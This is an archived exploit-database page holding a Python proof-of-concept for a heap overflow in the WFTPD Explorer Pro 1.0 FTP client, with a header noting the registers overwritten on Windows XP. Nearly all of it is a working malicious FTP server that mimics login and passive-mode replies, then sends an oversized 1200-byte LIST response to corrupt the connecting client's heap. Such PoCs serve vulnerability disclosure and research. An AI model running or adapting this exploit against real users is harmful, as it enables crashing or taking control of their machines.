<html><head><title>WFTPD Explorer Pro 1.0 Remote Heap Overflow PoC</title></head><pre>##########################################
#  WftpdExpPro_HeapPoC.py                #
#  Discovered by r4x (Kamil Szczerba)    #
#                      [r4xks@o2.pl]     #
##########################################
# Soft    : WFTPD Explorer Pro 1.0       #
# Vendor  : Texas Imperial Software      #
# Vuln    : Heap Overwlow (Res: LIST)    #
# Exploit : PoC Reg Overwrite            #
##########################################
# Reg:                                   #
#  EAX = 41414141                        #
#  ECX = 41414141                        #
#  EDX = 00a57b38 ASCII &quot;AAAA...&quot;        #
#  ESI = 00a57b30 ASCII &quot;AAAA...&quot;        #
#  ------------------------------        #
#  EIP = 7c91142E                        #
#                                        #
#  Exception c0000005 (ACCES_VIOLATION)  #
#                                        #
# MOV DWORD PTR DS:[ECX],EAX    ; HEHE   #
# MOV DWORD PTR DS:[EAX +4] ECX ;        #
#                                        #
# Test on: WinXPsp2 Polish 		 #
#                                        #
##########################################




from socket import *

heapb0f = &quot;A&quot; * 1200 + &quot;r\n&quot;

req = (
        &quot;USER&quot;,
        &quot;PASS&quot;,
        &quot;TYPE&quot;,
        &quot;PWD&quot;,
        &quot;PASV&quot;,
        &quot;LIST&quot;
        )
        
res = (
        &quot;331 Password required.\r\n&quot;,
        &quot;230 User logged in.\r\n&quot;,
        &quot;200 Type set to I.\r\n&quot;,
        &quot;257 '/' is current directory.\r\n&quot;,
        &quot;227 Entering Passive Mode (127,0,0,1,100,100).\r\n&quot;,
        &quot;150 Opening ASCII mode data connection for file list.\r\n&quot;,
        )

def parser(buff):

    cmd  = buff.split(&quot;\x20&quot;)[0]
    cmd1 = buff.split(&quot;\r\n&quot;)[0]
    if len(cmd) &gt; len(cmd1):
    	cmd = cmd1

    for i in range(len(req)):
        if req[i] == cmd:
            return res[i]
    
def multiserv(port1, port2):

    control = socket(AF_INET, SOCK_STREAM)
    control.bind(('', port1))
    control.listen(1)
    
    trans =  socket(AF_INET, SOCK_STREAM)
    trans.bind(('', port2))
    trans.listen(1)

    while(1):
        cclient, caddr = control.accept()
        print &quot;[*] Connected: &quot;, caddr
        cclient.send(&quot;220 Welcome: Evil Secure FTPD 1.666\r\n&quot;)
        
        while(1):
            
            r0 = cclient.recv(1024)
            print &quot;[&gt;] Input: %s&quot; % (r0)
            r1 = parser(r0)
            if r1 == None:
                r1 = &quot;502 Command not implemented.\r\n&quot;
            cclient.send(r1)
            print &quot;[&lt;] Output: %s&quot; % (r1)
            if r1 == res[4]:
                print &quot;[*] Data mode\n&quot;
                tclient, taddr = trans.accept()
                print &quot;[*] Connected: &quot;, taddr
            if r1 == res[5]:
                print &quot;[*] b00mb!&quot;
                tclient.send(heapb0f)
                print &quot;[*] done&quot;
                break
	break
                
                
                


multiserv(21, 25700)

# milw0rm.com [2007-12-18]</pre></html>